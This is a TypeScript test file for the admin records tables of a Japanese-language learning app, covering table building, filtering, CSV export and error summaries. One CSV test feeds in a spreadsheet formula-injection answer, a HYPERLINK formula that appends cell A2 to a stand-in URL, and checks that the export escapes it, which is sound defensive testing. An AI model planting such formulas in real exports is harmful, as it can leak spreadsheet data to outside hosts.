import { describe, expect, it } from "vitest";
import type { ProfileRow } from "../src/lib/profile-db";
import {
  buildLookups,
  buildRecordsCsv,
  EMPTY_FILTER,
  filterRows,
  listeningTable,
  matchesProfile,
  progressTable,
  quizTable,
  summaryTable,
  talkTable,
  wordTable,
} from "../src/lib/records/table";
import type { UnitRef } from "../src/lib/records/units";

function profile(over: Partial<ProfileRow> & { id: string }): ProfileRow {
  return {
    email: `${over.id}@example.com`,
    display_name: over.id,
    family_name: "",
    given_name: "",
    nickname: "",
    university: "AUPP",
    cohort: 1,
    gender: null,
    personality_type: null,
    answers: [],
    scores: {} as ProfileRow["scores"],
    personality_version: 3,
    answer_language: null,
    language_switched: false,
    is_admin: false,
    created_at: "2026-09-01T00:00:00.000Z",
    updated_at: "2026-09-01T00:00:00.000Z",
    ...over,
  };
}

const AYA = profile({ id: "aya", display_name: "アヤ", university: "AUPP", cohort: 1 });
const BOPHA = profile({ id: "bopha", display_name: "ボパー", university: "CADT", cohort: 2 });
const NOSCHOOL = profile({ id: "sok", display_name: "ソック", university: "", cohort: 0 });

const UNITS: UnitRef[] = [
  {
    id: "asakai-manga",
    type: "manga",
    title: "朝会の まんが",
    stageId: "asakai",
    stageTitle: "朝会",
    order: 0,
  },
  {
    id: "houkoku-quiz",
    type: "quizset",
    title: "報告の もんだい",
    stageId: "houkoku",
    stageTitle: "報告",
    order: 1,
  },
];

const LOOKUPS = buildLookups([AYA, BOPHA, NOSCHOOL], UNITS);

describe("学習のきろくを1つの表にそろえる", () => {
  it("先頭の5列は だれ・どこ（種類が変わっても同じ）", () => {
    const table = progressTable(
      [
        {
          profile_id: "aya",
          content_id: "asakai-manga",
          status: "completed",
          position: { page: 4 },
          started_at: "2026-09-02T01:00:00.000Z",
          completed_at: "2026-09-02T01:20:00.000Z",
          updated_at: "2026-09-02T01:20:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.columns.slice(0, 5).map((c) => c.key)).toEqual([
      "student",
      "school",
      "stage",
      "unit",
      "type",
    ]);
    expect(table.rows[0]?.cells).toMatchObject({
      student: "アヤ",
      school: "AUPP 1期生",
      stage: "朝会",
      unit: "朝会の まんが",
      type: "まんが",
      status: "おわった",
      position: "page=4",
    });
  });

  it("台帳に無い教材でも 行は消さない（無いことと 引けないことは別）", () => {
    const table = progressTable(
      [
        {
          profile_id: "aya",
          content_id: "けした-きょうざい",
          status: "started",
          position: null,
          started_at: "2026-09-02T01:00:00.000Z",
          completed_at: null,
          updated_at: "2026-09-02T01:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows).toHaveLength(1);
    expect(table.rows[0]?.cells.unit).toBe("けした-きょうざい");
  });

  it("もんだいは 何も書かずに 出したことも 分かるようにする", () => {
    const table = quizTable(
      [
        {
          id: "1",
          profile_id: "aya",
          quiz_set_id: "houkoku-quiz",
          question_id: "q3",
          question_type: "keyword",
          answer_text: "",
          correct: false,
          earned: 0,
          max_points: 2,
          question_index: 2,
          full_set: true,
          attempt_id: "abcdef01-0000-4000-a000-000000000000",
          created_at: "2026-09-02T02:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells).toMatchObject({
      question: "Q3 q3",
      answer: "（書いて いません）",
      correct: "×",
      points: "0/2",
    });
  });

  it("ことばのテストは 打った読みと 聞いていないことを 見分ける", () => {
    const table = wordTable(
      [
        {
          id: "a1",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-1",
          word_id: "w1",
          term: "研修",
          reading: "けんしゅう",
          meaning: "training",
          reading_input: "けんしゅ",
          reading_ok: false,
          meaning_input: "training",
          meaning_ok: true,
          word_index: 0,
          created_at: "2026-09-02T03:00:00.000Z",
        },
        {
          id: "a2",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-1",
          word_id: "w2",
          term: "出社",
          reading: "しゅっしゃ",
          meaning: "going to work",
          reading_input: "",
          reading_ok: null,
          meaning_input: "",
          meaning_ok: false,
          word_index: 1,
          created_at: "2026-09-02T03:01:00.000Z",
        },
      ],
      [
        {
          id: "r1",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-1",
          mode: "test",
          score: 3,
          max_score: 4,
          total: 2,
          reading_asked: 1,
          reading_correct: 0,
          meaning_correct: 1,
          passed: false,
          game_score: 0,
          best_combo: 1,
          created_at: "2026-09-02T03:02:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells).toMatchObject({
      word: "研修",
      readingInput: "けんしゅ",
      readingOk: "×",
      mode: "テスト",
      score: "3/4",
      passed: "もう いちど",
    });
    // 読みを 聞いていない 語は「—」。0点 と 見分ける
    expect(table.rows[1]?.cells).toMatchObject({
      readingOk: "—",
      readingInput: "（打って いません）",
      meaningInput: "（時間ぎれ）",
    });
  });

  it("れんしゅうの行に 不合格と 出さない", () => {
    const table = wordTable(
      [
        {
          id: "a1",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-2",
          word_id: "w1",
          term: "研修",
          reading: "けんしゅう",
          meaning: "training",
          reading_input: "けんしゅう",
          reading_ok: true,
          meaning_input: "training",
          meaning_ok: true,
          word_index: 0,
          created_at: "2026-09-02T03:00:00.000Z",
        },
      ],
      [
        {
          id: "r2",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-2",
          mode: "practice",
          score: 2,
          max_score: 2,
          total: 1,
          reading_asked: 1,
          reading_correct: 1,
          meaning_correct: 1,
          passed: false,
          game_score: 300,
          best_combo: 2,
          created_at: "2026-09-02T03:02:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.passed).toBe("—");
  });

  it("会話は ミーティングと たいわ を 1つの表にする", () => {
    const table = talkTable(
      [
        {
          id: "m1",
          profile_id: "aya",
          meeting_id: "houkoku-meeting",
          question_id: "q1",
          attempt: 2,
          mode: "voice",
          utterance: "きのう けんしゅうに 行きました",
          judge: { reply: "そうなんですね", praise: "はっきり 言えました", fix: "" },
          grade: "good",
          fallback: "none",
          created_at: "2026-09-02T04:00:00.000Z",
        },
      ],
      [
        {
          id: "t1",
          profile_id: "bopha",
          talk_id: "kaisha-talk",
          session_id: "s1",
          turn_index: 0,
          speaker: "partner",
          mode: "voice",
          body: "はじめまして",
          opened_req_id: "",
          opened_count: 0,
          req_total: 5,
          created_at: "2026-09-02T05:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows.map((row) => row.cells.kind)).toEqual(["ミーティング", "たいわ"]);
    expect(table.rows[0]?.cells).toMatchObject({
      speaker: "学生",
      note: "つたわった",
      way: "こえ",
    });
    expect(table.rows[1]?.cells).toMatchObject({ speaker: "あいて", note: "0/5 聞き出せた" });
  });

  it("AIに通せなかった回は そう書く（見かたが空なのと 別物）", () => {
    const table = talkTable(
      [
        {
          id: "m1",
          profile_id: "aya",
          meeting_id: "houkoku-meeting",
          question_id: "q1",
          attempt: 1,
          mode: "text",
          utterance: "はい",
          judge: null,
          grade: null,
          fallback: "quota",
          created_at: "2026-09-02T04:00:00.000Z",
        },
      ],
      [],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.note).toBe("（AIなし: quota）");
  });
});

describe("絞り込み", () => {
  const table = progressTable(
    [
      {
        profile_id: "aya",
        content_id: "asakai-manga",
        status: "started",
        position: null,
        started_at: "2026-09-02T01:00:00.000Z",
        completed_at: null,
        updated_at: "2026-09-02T01:00:00.000Z",
      },
      {
        profile_id: "bopha",
        content_id: "houkoku-quiz",
        status: "completed",
        position: null,
        started_at: "2026-09-03T01:00:00.000Z",
        completed_at: "2026-09-03T01:00:00.000Z",
        updated_at: "2026-09-03T01:00:00.000Z",
      },
    ],
    LOOKUPS,
  );

  it("学校で 分ける", () => {
    const rows = filterRows(table, { ...EMPTY_FILTER, university: "CADT" }, LOOKUPS);
    expect(rows.map((row) => row.profileId)).toEqual(["bopha"]);
  });

  it("期生で 分ける", () => {
    expect(
      filterRows(table, { ...EMPTY_FILTER, cohort: 1 }, LOOKUPS).map((row) => row.profileId),
    ).toEqual(["aya"]);
  });

  it("未設定の人だけを 探せる", () => {
    expect(matchesProfile(NOSCHOOL, { ...EMPTY_FILTER, cohort: -1 })).toBe(true);
    expect(matchesProfile(AYA, { ...EMPTY_FILTER, cohort: -1 })).toBe(false);
  });

  it("メンバー・ステージ・単元で 分ける", () => {
    expect(
      filterRows(table, { ...EMPTY_FILTER, profileId: "aya" }, LOOKUPS).map((r) => r.unitId),
    ).toEqual(["asakai-manga"]);
    expect(
      filterRows(table, { ...EMPTY_FILTER, stageId: "houkoku" }, LOOKUPS).map((r) => r.unitId),
    ).toEqual(["houkoku-quiz"]);
    expect(filterRows(table, { ...EMPTY_FILTER, unitId: "asakai-manga" }, LOOKUPS)).toHaveLength(1);
  });

  it("ことばで さがす（学生の名前も こたえも）", () => {
    expect(filterRows(table, { ...EMPTY_FILTER, text: "ボパー" }, LOOKUPS)).toHaveLength(1);
    expect(filterRows(table, { ...EMPTY_FILTER, text: "いない人" }, LOOKUPS)).toHaveLength(0);
  });

  it("新しい ものが 上（先生が 開くのは 授業の 直後）", () => {
    expect(filterRows(table, EMPTY_FILTER, LOOKUPS).map((row) => row.profileId)).toEqual([
      "bopha",
      "aya",
    ]);
  });
});

describe("CSV", () => {
  it("見えている 表を そのまま 出す（BOM つき・CRLF）", () => {
    const table = listeningTable(
      [
        {
          profile_id: "aya",
          listening_id: "asakai-listening",
          inputs: ["けんしゅう"],
          reveal_percent: 20,
          keywords_left: 3,
          updated_at: "2026-09-02T06:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    const csv = buildRecordsCsv(table.columns, filterRows(table, EMPTY_FILTER, LOOKUPS));
    expect(csv.startsWith("﻿")).toBe(true);
    const [header, row] = csv.slice(1).split("\r\n");
    expect(header?.startsWith("学生,所属,ステージ,単元,種別")).toBe(true);
    expect(row?.startsWith("アヤ,AUPP 1期生")).toBe(true);
  });

  it("数式に 見える こたえを、先生の Excel が 実行しない", () => {
    const table = quizTable(
      [
        {
          id: "1",
          profile_id: "aya",
          quiz_set_id: "houkoku-quiz",
          question_id: "q1",
          question_type: "keyword",
          answer_text: '=HYPERLINK("http://example.invalid/"&A2,"OK")',
          correct: false,
          earned: 0,
          max_points: 2,
          question_index: 0,
          full_set: true,
          attempt_id: "abcdef01-0000-4000-a000-000000000000",
          created_at: "2026-09-02T02:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    const csv = buildRecordsCsv(table.columns, table.rows);
    // 先頭に ' が 付き、数式では なく 文字として 読まれる
    expect(csv).toContain("\"'=HYPERLINK(");
    expect(csv).not.toContain(",=HYPERLINK(");
  });

  it("カンマ・引用符・改行を 含む こたえを 壊さない", () => {
    const table = quizTable(
      [
        {
          id: "1",
          profile_id: "aya",
          quiz_set_id: "houkoku-quiz",
          question_id: "q1",
          question_type: "keyword",
          answer_text: 'A, B と "C"\nつぎの行',
          correct: true,
          earned: 2,
          max_points: 2,
          question_index: 0,
          full_set: true,
          attempt_id: "abcdef01-0000-4000-a000-000000000000",
          created_at: "2026-09-02T02:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    const csv = buildRecordsCsv(table.columns, table.rows);
    expect(csv).toContain('"A, B と ""C""\nつぎの行"');
  });
});

/* ------------------------------------------------------------------ *
 * つまずき（まとめ）
 *
 * 畳んだ 2画面（`/admin/meetings`・`/admin/quizzes`）が いちばん 上に 置いて いた もの。
 * **並びが 崩れると 直す順が 読み取れなく なる**ので、並びと 数えかたを ここで 固定する
 *（削除した tests/meeting_logs.test.ts が 守って いた 約束を 引き継ぐ）。
 * ------------------------------------------------------------------ */

function quizRow(over: Partial<Parameters<typeof quizTable>[0][number]>) {
  return {
    id: Math.random().toString(36).slice(2),
    profile_id: "aya",
    quiz_set_id: "houkoku-quiz",
    question_id: "q1",
    question_type: "keyword",
    answer_text: "",
    correct: true,
    earned: 1,
    max_points: 1,
    question_index: 0,
    full_set: true,
    attempt_id: "att-1",
    created_at: "2026-09-02T02:00:00.000Z",
    ...over,
  };
}

function meetingRow(over: Partial<Parameters<typeof talkTable>[0][number]>) {
  return {
    id: Math.random().toString(36).slice(2),
    profile_id: "aya",
    meeting_id: "houkoku-meeting",
    question_id: "q1",
    attempt: 1,
    mode: "text" as const,
    utterance: "はい",
    judge: null,
    grade: null,
    fallback: "none",
    created_at: "2026-09-02T04:00:00.000Z",
    ...over,
  };
}

describe("つまずきの まとめ", () => {
  it("もんだいは 正答率の ひくい順（直す順が 上から 読める）", () => {
    const table = quizTable(
      [
        quizRow({ question_id: "easy", question_index: 0, correct: true }),
        quizRow({ question_id: "easy", question_index: 0, correct: true, profile_id: "bopha" }),
        quizRow({
          question_id: "hard",
          question_index: 1,
          correct: false,
          answer_text: "けんしゅ",
        }),
        quizRow({
          question_id: "hard",
          question_index: 1,
          correct: false,
          answer_text: "けんしゅ",
          profile_id: "bopha",
        }),
      ],
      LOOKUPS,
    );
    const summary = summaryTable("quiz", table.rows)!;
    expect(summary.rows.map((row) => row.cells.group)).toEqual(["Q2 hard", "Q1 easy"]);
    expect(summary.rows[0]?.cells).toMatchObject({
      answered: "2",
      correct: "0",
      rate: "0%",
      people: "2",
      // まちがえた こたえは 多い順（書き方の ゆれが ここで 見つかる）
      misses: "けんしゅ（2）",
    });
  });

  it("何も 書かずに こたえを 見た のも まちがいとして 数える（そこで 詰まった 証拠）", () => {
    const table = quizTable([quizRow({ correct: false, answer_text: "" })], LOOKUPS);
    expect(summaryTable("quiz", table.rows)?.rows[0]?.cells.misses).toBe(
      "（書いて いません）（1）",
    );
  });

  it("会話は「もう いちど」の 多い順（ヒントの 作りを 疑う 順）", () => {
    const table = talkTable(
      [
        meetingRow({ question_id: "ok", grade: "veryGood" }),
        meetingRow({ question_id: "stuck", grade: "miss" }),
        meetingRow({ question_id: "stuck", grade: "miss", attempt: 2 }),
        meetingRow({ question_id: "stuck", grade: null, fallback: "quota" }),
      ],
      [],
      LOOKUPS,
    );
    const summary = summaryTable("talk", table.rows)!;
    expect(summary.rows.map((row) => row.cells.group)).toEqual(["stuck", "ok"]);
    expect(summary.rows[0]?.cells).toMatchObject({
      turns: "2",
      miss: "2",
      retried: "1",
    });
    // AIに 通せなかった 回は 見かたが 空なので、まとめの 母数には 入れない
    expect(summary.rows[0]?.cells.veryGood).toBe("0");
  });

  it("たいわ は つまずきの まとめに 出さない（三段の 評価で 進む 教材では ない）", () => {
    const table = talkTable(
      [],
      [
        {
          id: "t1",
          profile_id: "aya",
          talk_id: "kaisha-talk",
          session_id: "s1",
          turn_index: 0,
          speaker: "learner",
          mode: "voice",
          body: "よさんは いくらですか",
          opened_req_id: "budget",
          opened_count: 1,
          req_total: 5,
          created_at: "2026-09-02T05:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    // 明細には 出る（手ごたえは「見かた」列で 読む）
    expect(table.rows[0]?.cells.note).toBe("1/5 聞き出せた");
    // まとめには 出ない——「聞き出せた＝すばらしい」と 読み替えると 全部 すばらしいに なる
    expect(summaryTable("talk", table.rows)).toBeNull();
  });

  it("進み具合は おわった率の ひくい順（まだ 誰も 終えて いない 教材が 上）", () => {
    const table = progressTable(
      [
        {
          profile_id: "aya",
          content_id: "asakai-manga",
          status: "completed",
          position: null,
          started_at: "2026-09-02T01:00:00.000Z",
          completed_at: "2026-09-02T01:00:00.000Z",
          updated_at: "2026-09-02T01:00:00.000Z",
        },
        {
          profile_id: "aya",
          content_id: "houkoku-quiz",
          status: "started",
          position: null,
          started_at: "2026-09-02T01:00:00.000Z",
          completed_at: null,
          updated_at: "2026-09-02T01:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    const summary = summaryTable("progress", table.rows)!;
    expect(summary.rows.map((row) => row.cells.group)).toEqual([
      "報告の もんだい",
      "朝会の まんが",
    ]);
    expect(summary.rows[0]?.cells).toMatchObject({ opened: "1", done: "0", rate: "0%" });
  });

  it("ことばは 読みと いみの 両方 合って はじめて できた", () => {
    const table = wordTable(
      [
        {
          id: "a1",
          profile_id: "aya",
          stage_id: "kaisha",
          attempt_id: "att-1",
          word_id: "w1",
          term: "研修",
          reading: "けんしゅう",
          meaning: "training",
          reading_input: "けんしゅ",
          reading_ok: false,
          meaning_input: "training",
          // いみは 合って いるが 読みを 外した ＝ できて いない
          meaning_ok: true,
          word_index: 0,
          created_at: "2026-09-02T03:00:00.000Z",
        },
      ],
      [],
      LOOKUPS,
    );
    const summary = summaryTable("word", table.rows)!;
    expect(summary.rows[0]?.cells).toMatchObject({
      group: "研修",
      correct: "0",
      rate: "0%",
      // 打った 読みが そのまま 出る（長音の 教え方を 疑う 手がかり）
      misses: "けんしゅ（1）",
    });
  });

  it("数える ものが 無ければ まとめは 出さない", () => {
    expect(summaryTable("quiz", [])).toBeNull();
  });

  it("絞り込んだ あとの 行から 数える（畳む 前は 全員ぶんしか 出せなかった）", () => {
    const table = quizTable(
      [
        quizRow({ profile_id: "aya", correct: false }),
        quizRow({ profile_id: "bopha", correct: true }),
      ],
      LOOKUPS,
    );
    const onlyAya = filterRows(table, { ...EMPTY_FILTER, profileId: "aya" }, LOOKUPS);
    expect(summaryTable("quiz", onlyAya)?.rows[0]?.cells).toMatchObject({
      answered: "1",
      rate: "0%",
    });
  });
});
